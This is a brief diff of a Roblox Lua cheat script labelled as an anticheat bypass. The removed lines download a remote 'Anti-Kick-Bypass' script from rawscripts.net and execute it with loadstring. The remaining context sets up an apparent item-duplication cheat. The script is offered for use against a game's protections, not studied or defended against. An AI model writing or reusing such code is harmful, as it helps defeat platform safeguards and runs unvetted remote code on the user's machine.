@@ -1,6 +1,5 @@
 -- bypass anticheat script
-local str = game:HttpGet("https://rawscripts.net/raw/Steal-a-Brainrot-Anti-Kick-Bypass-41960")
-loadstring(str)()
+
 local localplr = game.Players.LocalPlayer
 getgenv().deletewhendupefound = true
 local on = true
